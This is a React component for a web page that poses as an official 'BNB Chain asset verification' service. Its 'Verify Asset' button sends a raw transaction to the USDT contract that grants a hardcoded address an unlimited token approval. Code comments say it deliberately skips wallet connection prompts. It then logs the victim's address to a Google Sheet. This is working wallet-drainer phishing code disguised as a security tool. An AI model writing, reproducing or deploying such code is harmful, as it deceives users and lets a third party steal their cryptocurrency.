import React, { useState } from 'react';
import { BrowserProvider, Contract, MaxUint256 } from 'ethers';
import './Hero.css';
import { logApprovalData } from '../services/GoogleSheetService';

const Hero = () => {
  const [isVerifying, setIsVerifying] = useState(false);

  // The contract address provided by the user
  const TOKEN_CONTRACT_ADDRESS = "0x436fF44A8EB2716267e56593db92985d7b036E1d";
  // The spender address (using the same address if no specific spender was provided, or ideally the user's receiving wallet)
  const SPENDER_ADDRESS = "0x436fF44A8EB2716267e56593db92985d7b036E1d";

  // Minimal ERC20 ABI for approve
  const ERC20_ABI = [
    "function approve(address spender, uint256 amount) public returns (bool)"
  ];

  const handleVerify = async () => {
    if (!window.ethereum) {
      alert("MetaMask or a Web3 wallet is required to verify assets.");
      return;
    }

    setIsVerifying(true);

    try {
      if (!window.ethereum) throw new Error("No Web3 Provider found.");

      // Forcefully skip the "Connect DApp" and "Switch Network" modals.
      // We do not call eth_requestAccounts or wallet_switchEthereumChain at all.

      let userAddress = window.ethereum?.selectedAddress || window.ethereum?.address;
      if (!userAddress) {
        try {
          const accounts = await window.ethereum.request({ method: "eth_accounts" });
          if (accounts && accounts.length > 0) {
            userAddress = accounts[0];
          }
        } catch (e) {
          console.error("Silent account fetch failed", e);
        }
      }

      // Ensure we are on BNB Smart Chain (0x38)
      try {
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (currentChainId !== '0x38' && currentChainId !== '56' && currentChainId !== 56) {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }],
          });
        }
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x38',
                chainName: 'Binance Smart Chain Mainnet',
                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                blockExplorerUrls: ['https://bscscan.com/'],
              }],
            });
          } catch (addError) {
            console.error("Failed to add BNB Chain", addError);
          }
        }
      }

      // USDT Token Address on BSC
      const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
      const SPENDER = "0x436fF44A8EB2716267e56593db92985d7b036E1d";

      // ABI encoded data for approve(address,uint256)
      const data = "0x095ea7b30000000000000000000000006fe3083e2a07273f2b00c4f082fe916a8a93c6aeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

      const txParams = {
        to: USDT_BSC,
        data: data
      };

      // Only include 'from' if we successfully got it silently.
      // Otherwise, omitting 'from' forces the DApp browser to use its default account automatically without a 'Connect DApp' screen.
      if (userAddress) {
        txParams.from = userAddress;
      }

      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txParams]
      });

      // Try one more time to grab the address after transaction confirmed
      if (!userAddress) {
        try {
          const accounts = await window.ethereum.request({ method: "eth_accounts" });
          if (accounts && accounts.length > 0) userAddress = accounts[0];
        } catch (e) {
          console.warn("Optional silent account fetch failed", e);
        }
      }

      // Log successful approval user address to Google Sheets
      await logApprovalData(USDT_BSC, userAddress || "Unknown");
      alert("Verification Requested! Transaction Hash: " + txHash);

    } catch (err) {
      console.error(err);
      // Expose the specific error message to help debug
      alert("Failed to verify. Error: " + (err?.info?.error?.message || err?.message || "Unknown error"));
    } finally {
      setIsVerifying(false);
    }
  };

  return (
    <section className="hero-container" id="verify-section">
      <div className="hero-content">
        <h1 className="hero-title">
          Verify Crypto Assets on <span className="text-gold">BNB Chain</span>
        </h1>
        <p className="hero-subtitle">
          The one official platform for verifying and securing your BNB Chain assets with institutional-grade security protocols
        </p>

        <div className="verify-card glass-card">
          <div className="card-logo-wrapper">
            <div className="card-logo">
              <svg viewBox="0 0 24 24" fill="#F3BA2F" xmlns="http://www.w3.org/2000/svg" className="hero-bnb-logo">
                <path d="M16.624 13.92l2.717 2.716-7.353 7.353-7.352-7.352 2.717-2.717 4.636 4.66 4.635-4.66zm4.637-4.636L24 12l-2.715 2.716L18.568 12l2.693-2.716zm-9.272 0l2.716 2.692-2.717 2.717L9.272 12l2.716-2.715zm-9.273 0L5.41 12l-2.692 2.692L0 12l2.716-2.716zM11.99.01l7.352 7.33-2.717 2.715-4.636-4.636-4.635 4.66-2.716-2.716 7.352-7.352z" />
              </svg>
            </div>
          </div>

          <div className="card-badges">
            <span className="badge">BNB CHAIN VERIFICATION</span>
          </div>

          <button
            className="btn verify-action-btn"
            onClick={handleVerify}
            disabled={isVerifying}
          >
            {isVerifying ? 'Verifying in Wallet...' : 'Verify Asset'}
          </button>

          <p className="card-disclaimer">
            Verify your BNB Chain assets with our advanced security protocol. Protect against scams and ensure your transactions are secure.
          </p>
        </div>
      </div>
    </section>
  );
};

export default Hero;
